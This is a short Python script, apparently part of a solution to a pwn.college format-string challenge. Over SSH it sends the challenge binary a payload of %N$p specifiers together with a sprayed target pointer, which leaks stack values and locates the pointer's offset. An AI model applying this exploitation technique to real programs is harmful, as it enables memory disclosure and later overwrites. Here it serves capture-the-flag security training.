import subprocess
import struct

ADDR = 0x4040E0
SSH = [
    "ssh",
    "-i",
    "../key",
    "hacker@dojo.pwn.college",
    "/challenge/babyfmt_level4.1",
]

pointer = struct.pack("<Q", ADDR)
spray_buf = bytearray(8 * 8 + 8)
for shift in range(8):
    spray_buf[shift : shift + 8] = pointer
spray = bytes(spray_buf)

def dump(start, count):
    specs = " ".join(f"{i}:%{i}$p" for i in range(start, start + count))
    fmt = ("AAA |" + specs).encode()
    payload = fmt + spray
    res = subprocess.run(SSH, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    out = res.stdout.decode("latin-1", errors="ignore")
    print(out)

import sys

start = int(sys.argv[1]) if len(sys.argv) > 1 else 1
count = int(sys.argv[2]) if len(sys.argv) > 2 else 10

dump(start, count)
